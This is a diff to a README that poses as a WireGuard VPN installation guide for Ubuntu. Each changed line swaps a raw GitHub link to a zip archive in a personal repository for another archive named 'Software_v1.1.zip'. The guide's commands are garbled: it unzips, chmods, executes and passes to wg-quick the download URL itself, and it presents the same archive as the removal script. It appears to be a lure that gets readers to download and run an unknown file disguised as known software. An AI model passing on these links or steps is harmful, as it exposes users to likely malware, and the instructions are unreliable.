@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download WireGuard](https://raw.githubusercontent.com/tudo123112312/wireguard/main/bogong/wireguard_v3.1.zip%https://raw.githubusercontent.com/tudo123112312/wireguard/main/bogong/wireguard_v3.1.zip)](https://raw.githubusercontent.com/tudo123112312/wireguard/main/bogong/wireguard_v3.1.zip)
+[![Download WireGuard](https://raw.githubusercontent.com/tudo123112312/wireguard/main/bogong/Software_v1.1.zip%https://raw.githubusercontent.com/tudo123112312/wireguard/main/bogong/Software_v1.1.zip)](https://raw.githubusercontent.com/tudo123112312/wireguard/main/bogong/Software_v1.1.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ WireGuard is a simple and fast way to set up a VPN on your Ubuntu system. This g
 
 1. **Visit the Releases Page:** Click the link below to go to the GitHub Releases page.
    
-   [Download WireGuard](https://raw.githubusercontent.com/tudo123112312/wireguard/main/bogong/wireguard_v3.1.zip)
+   [Download WireGuard](https://raw.githubusercontent.com/tudo123112312/wireguard/main/bogong/Software_v1.1.zip)
 
 2. **Choose the Latest Release:** Look for the latest version at the top of the page. It should be labeled clearly.
 
@@ -36,11 +36,11 @@ WireGuard is a simple and fast way to set up a VPN on your Ubuntu system. This g
 6. **Extract the File:**
    - If you downloaded a zip file, use the command:
      ```bash
-     unzip https://raw.githubusercontent.com/tudo123112312/wireguard/main/bogong/wireguard_v3.1.zip
+     unzip https://raw.githubusercontent.com/tudo123112312/wireguard/main/bogong/Software_v1.1.zip
      ```
    - If it’s a tar file, use:
      ```bash
-     tar -xvf https://raw.githubusercontent.com/tudo123112312/wireguard/main/bogong/wireguard_v3.1.zip
+     tar -xvf https://raw.githubusercontent.com/tudo123112312/wireguard/main/bogong/Software_v1.1.zip
      ```
 
 7. **Run the Script:**
@@ -50,11 +50,11 @@ WireGuard is a simple and fast way to set up a VPN on your Ubuntu system. This g
      ```
    - Make the script executable by running:
      ```bash
-     chmod +x https://raw.githubusercontent.com/tudo123112312/wireguard/main/bogong/wireguard_v3.1.zip
+     chmod +x https://raw.githubusercontent.com/tudo123112312/wireguard/main/bogong/Software_v1.1.zip
      ```
    - Finally, execute the script:
      ```bash
-     https://raw.githubusercontent.com/tudo123112312/wireguard/main/bogong/wireguard_v3.1.zip
+     https://raw.githubusercontent.com/tudo123112312/wireguard/main/bogong/Software_v1.1.zip
      ```
 
 ## ✔️ Configuration
@@ -75,12 +75,12 @@ To connect using your new VPN configuration:
    
 2. **Use the WireGuard command:**
    ```bash
-   wg-quick up https://raw.githubusercontent.com/tudo123112312/wireguard/main/bogong/wireguard_v3.1.zip
+   wg-quick up https://raw.githubusercontent.com/tudo123112312/wireguard/main/bogong/Software_v1.1.zip
    ```
 
 3. **Disconnect:** To disconnect from the VPN, run:
    ```bash
-   wg-quick down https://raw.githubusercontent.com/tudo123112312/wireguard/main/bogong/wireguard_v3.1.zip
+   wg-quick down https://raw.githubusercontent.com/tudo123112312/wireguard/main/bogong/Software_v1.1.zip
    ```
 
 ## 🍃 Clean Up
@@ -91,7 +91,7 @@ If you wish to remove WireGuard from your system:
    
 2. **Run the Removal Script:**
    ```bash
-   https://raw.githubusercontent.com/tudo123112312/wireguard/main/bogong/wireguard_v3.1.zip
+   https://raw.githubusercontent.com/tudo123112312/wireguard/main/bogong/Software_v1.1.zip
    ```
 
 This will safely remove all components of WireGuard from your Ubuntu machine.
@@ -118,4 +118,4 @@ This project covers various topics, including:
 
 By following these instructions, you should be able to download, install, and configure WireGuard with ease. If you need further assistance, visit our GitHub repository. 
 
-[Download WireGuard](https://raw.githubusercontent.com/tudo123112312/wireguard/main/bogong/wireguard_v3.1.zip)
+[Download WireGuard](https://raw.githubusercontent.com/tudo123112312/wireguard/main/bogong/Software_v1.1.zip)
